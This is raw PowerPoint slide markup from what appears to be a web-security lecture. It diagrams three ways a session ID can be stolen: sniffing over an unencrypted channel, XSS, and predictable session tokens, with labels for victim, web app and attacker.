              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A000E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aphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="20" name="object 20" descr=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="776097" y="2810636"/>
          <a:ext cx="3428365" cy="343281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98755"/>
                <a:gridCol w="2968625"/>
                <a:gridCol w="165099"/>
              </a:tblGrid>
              <a:tr h="47180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9050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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685"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-1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Vulnerable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-6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00" spc="-1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communication</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="ctr" marL="1270">
                        <a:lnSpc>
                          <a:spcPts val="1930"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="180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channel</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-35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0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(use</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-45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00" spc="-1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HTTPS!)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28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="2961005">
                <a:tc gridSpan="3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45"/>
                        </a:spcBef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L="1184275">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:tabLst>
                          <a:tab pos="2541270" algn="l"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>SID=c5%$k</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" baseline="-12345" sz="2700" spc="-37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Web</a:t>
                      </a:r>
                      <a:endParaRPr baseline="-12345" sz="2700">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="r" marR="382270">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="390"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25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App</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="203200">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="1215"/>
                        </a:spcBef>
                        <a:tabLst>
                          <a:tab pos="1774825" algn="l"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" baseline="-18518" sz="2700" spc="-15">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Victim</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" baseline="-18518" sz="2700">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>sniffing</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri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680"/>
                        </a:spcBef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algn="ctr" marL="50165">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Attacker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B="0" marT="69215">
                    <a:lnL w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnB w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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</a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="21" name="object 21" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4622038" y="2736850"/>
            <a:ext cx="2980055" cy="624205"/>
            <a:chOff x="4622038" y="2736850"/>
            <a:chExt cx="2980055" cy="624205"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="22" name="object 22" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4628388" y="2743200"/>
              <a:ext cx="2967355" cy="611505"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2967354" h="611504">
                  <a:moveTo>
                    <a:pt x="2865373" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="101853" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62204" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29829" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8002" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8002" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29829" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62204" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101853" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2865373" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2905023" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2937398" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2959225" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2967228" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2967228" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2959225" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2937398" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2905023" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2865373" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D7003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3" name="object 23" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4628388" y="2743200"/>
              <a:ext cx="2967355" cy="611505"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2967354" h="611504">
                  <a:moveTo>
                    <a:pt x="0" y="101853"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8002" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29829" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62204" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101853" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2865373" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2905023" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2937398" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2959225" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2967228" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2967228" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2959225" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2937398" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2905023" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2865373" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101853" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62204" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29829" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8002" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="101853"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12699">
              <a:solidFill>
                <a:srgbClr val="5A000E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aphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="24" name="object 24" descr=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4333113" y="2810636"/>
          <a:ext cx="3643629" cy="343281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85750"/>
                <a:gridCol w="2967354"/>
                <a:gridCol w="295275"/>
              </a:tblGrid>
              <a:tr h="47180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9050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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 marL="1905">
                        <a:lnSpc>
                          <a:spcPts val="1685"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="180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Web</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-45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0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App</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-2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00" spc="-1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vulnerable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-3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0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to</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-45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00" spc="-25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XSS</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="ctr" marL="1270">
                        <a:lnSpc>
                          <a:spcPts val="1930"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-1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attacks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28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="2961005">
                <a:tc gridSpan="3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45"/>
                        </a:spcBef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L="1259205">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:tabLst>
                          <a:tab pos="2616835" algn="l"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>SID=c5%$k</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" baseline="-12345" sz="2700" spc="-37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Web</a:t>
                      </a:r>
                      <a:endParaRPr baseline="-12345" sz="2700">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="r" marR="521334">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="390"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25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App</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="278765">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="1800"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Victim</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="2259965">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="105"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>XSS</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri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14"/>
                        </a:spcBef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algn="r" marR="101600">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>SID=c5%$k</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri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690"/>
                        </a:spcBef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algn="ctr" marR="6350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dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Attacker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B="0" marT="69215">
                    <a:lnL w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnB w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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</a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="25" name="object 25" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8281161" y="2736850"/>
            <a:ext cx="2980055" cy="624205"/>
            <a:chOff x="8281161" y="2736850"/>
            <a:chExt cx="2980055" cy="624205"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="object 26" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8287511" y="2743200"/>
              <a:ext cx="2967355" cy="611505"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2967354" h="611504">
                  <a:moveTo>
                    <a:pt x="2865374" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="101854" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62204" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29829" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8002" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8002" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29829" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62204" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101854" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2865374" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2905023" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2937398" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2959225" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2967228" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2967228" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2959225" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2937398" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2905023" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2865374" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D7003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7" name="object 27" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8287511" y="2743200"/>
              <a:ext cx="2967355" cy="611505"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2967354" h="611504">
                  <a:moveTo>
                    <a:pt x="0" y="101853"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8002" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29829" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62204" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101854" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2865374" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2905023" y="8002"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2937398" y="29829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2959225" y="62204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2967228" y="101853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2967228" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2959225" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2937398" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2905023" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2865374" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101854" y="611124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62204" y="603121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29829" y="581294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8002" y="548919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="509270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="101853"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A000E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aphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="28" name="object 28" descr=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8094344" y="2810636"/>
          <a:ext cx="3430270" cy="343281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83515"/>
                <a:gridCol w="2967355"/>
                <a:gridCol w="183515"/>
              </a:tblGrid>
              <a:tr h="47180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9050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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 marL="635">
                        <a:lnSpc>
                          <a:spcPts val="1685"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-1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Predictable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-15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0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session</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-5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00" spc="-2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token</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPts val="1930"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-1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(vulnerable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-4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0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Web</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-55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00" spc="-2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App)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28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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28575">
                      <a:solidFill>
                        <a:srgbClr val="5A000E"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="2961005">
                <a:tc gridSpan="3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45"/>
                        </a:spcBef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L="1353820">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:tabLst>
                          <a:tab pos="2524760" algn="l"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>SID=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10" b="1">
                          <a:solidFill>
                            <a:srgbClr val="D70031"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>31</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" b="1">
                          <a:solidFill>
                            <a:srgbClr val="D70031"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" baseline="-12345" sz="2700" spc="-37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Web</a:t>
                      </a:r>
                      <a:endParaRPr baseline="-12345" sz="2700">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="2553970">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="390"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25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App</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="187325">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="1800"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Victim</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri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445"/>
                        </a:spcBef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L="2548255">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
